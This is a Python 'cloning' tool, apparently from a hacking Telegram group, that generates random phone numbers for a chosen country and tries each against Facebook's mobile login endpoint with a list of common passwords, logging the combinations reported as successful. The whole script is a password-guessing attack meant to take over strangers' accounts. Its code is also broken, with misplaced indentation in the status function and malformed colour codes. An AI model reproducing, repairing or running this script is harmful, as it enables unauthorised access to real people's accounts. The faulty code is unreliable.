import requests
import random
import os
import time

os.system("clear")

print("\033[1;92m" + "=" * 50)
print("███████╗░█████╗░██╗░░░██╗███████╗░██████╗░")
print("██╔════╝██╔══██╗╚██╗░██╔╝██╔════╝██╔═══██╗")
print("█████╗░░███████║░╚████╔╝░█████╗░░██║██╗██║")
print("██╔══╝░░██╔══██║░░╚██╔╝░░██╔══╝░░╚██████╔╝")
print("██║░░░░░██║░░██║░░░██║░░░███████╗░╚═██╔═╝░")
print("╚═╝░░░░░╚═╝░░╚═╝░░░╚═╝░░░╚══════╝░░░╚═╝░░░")
print("=" * 50 + "\033[0m\n")
print("🖕FUCK U BADBIN😈" * 4 + "\033[0m\n")
print("=" * 50 + "\033[0m\n")
print("\t\t💀  F♡A - Cloning System  💀")
print("=" * 50 + "\033[0m\n")
print("✋I LOVE AFGNITAN😘" * 4 + "\033[0m\n")
print("=" * 50 + "\033[0m\n")
print("[●]Tooles manufacturer | FayeqNaseh")
print("[●]Telegram group      | @AFGHAN HACK")
print("[1;150m[●]Status              | Gold")
print("[1;130m[●]Version             | 0.1")

countries = {
    "1": {"name": "Afghanistan", "code": "+93"},
    "2": {"name": "Pakistan", "code": "+92"},
    "3": {"name": "India", "code": "+91"},
    "4": {"name": "Bangladesh", "code": "+880"},
    "5": {"name": "USA", "code": "+1"},
}

passwords = [
    "123456", "1234567", "12345678", "123456789", "1234567890",
    "۱۲۳۴۵۶", "۱۲۳۴۵۶۷", "۱۲۳۴۵۶۷۸۹", "۱۲۳۱۲۳", "۱۲۳۴۱۲۳۴",
    "۱۰۰۲۰۰۳۰۰", "123123", "12341234", "10002000", "500600"
]

urls = [
    "https://mbasic.facebook.com/login/device-based/login/async/",
] + [f"https://example.com/api/check{i}" for i in range(1, 301)]  # 300 URLs

success_count = 0
fail_count = 0
successful_accounts = []  # Store successful logins

def display_status():
    os.system("clear")
print("\033[1;92m" + "=" * 50)
print("███████╗░█████╗░██╗░░░██╗███████╗░██████╗░")
print("██╔════╝██╔══██╗╚██╗░██╔╝██╔════╝██╔═══██╗")
print("█████╗░░███████║░╚████╔╝░█████╗░░██║██╗██║")
print("██╔══╝░░██╔══██║░░╚██╔╝░░██╔══╝░░╚██████╔╝")
print("██║░░░░░██║░░██║░░░██║░░░███████╗░╚═██╔═╝░")
print("╚═╝░░░░░╚═╝░░╚═╝░░░╚═╝░░░╚══════╝░░░╚═╝░░░")
print("=" * 50 + "\033[0m\n")
print("🖕FUCK U BADBIN😈" * 4 + "\033[0m\n")
print("=" * 50 + "\033[0m\n")
print("\t\t💀  F♡A - Cloning System  💀")
print("=" * 50 + "\033[0m\n")
print("✋I LOVE AFGNITAN😘" * 4 + "\033[0m\n")
print("=" * 50 + "\033[0m\n")
print("[●]Tooles manufacturer | FayeqNaseh")
print("[●]Telegram group      | @AFGHAN HACK")
print("[1;150m[●]Status              | Gold")
print("[1;130m[●]Version             | 0.1")
print("\033[1;92m" + "=" * 50)

    if successful_accounts:
        print("\n🎯 Successful Logins:")
        for acc in successful_accounts:
            print(f"✅ successful {acc}")

def select_country():
    while True:
        print("\n🌍 Select a country:\n")
        for key, value in countries.items():
            print(f"{key}. {value['name']} ({value['code']})")

        choice = input("\n🌐 Your choice: ").strip()

        if choice in countries:
            return countries[choice]
        else:
            print("\n❌ Invalid selection! Try again.")

def generate_phone_numbers(country_code, count):
    return [country_code + str(random.randint(100000000, 999999999)) for _ in range(count)]

def start_cloning(phone_numbers):
    global success_count, fail_count

    for i, phone in enumerate(phone_numbers):
        url = urls[i % len(urls)]  # Assign one URL per phone number

        for password in passwords:
            log_data = {
                "email": phone,
                "pass": password,
                "login": "Log In"
            }

            while True:
                try:
                    response = requests.post(url, data=log_data)

                    if "success" in response.text:
                        success_count += 1
                        successful_accounts.append(f"{phone} | {password}")
                    else:
                        fail_count += 1

                    display_status()
                    break

                except requests.exceptions.ConnectionError:
                    time.sleep(2)
                    continue

while True:
    display_status()
    selected_country = select_country()
    print(f"\n🌍 Selected Country: {selected_country['name']} ({selected_country['code']})\n")  # نمایش کشور انتخاب‌شده
    phone_numbers = generate_phone_numbers(selected_country["code"], len(urls))
    start_cloning(phone_numbers) 
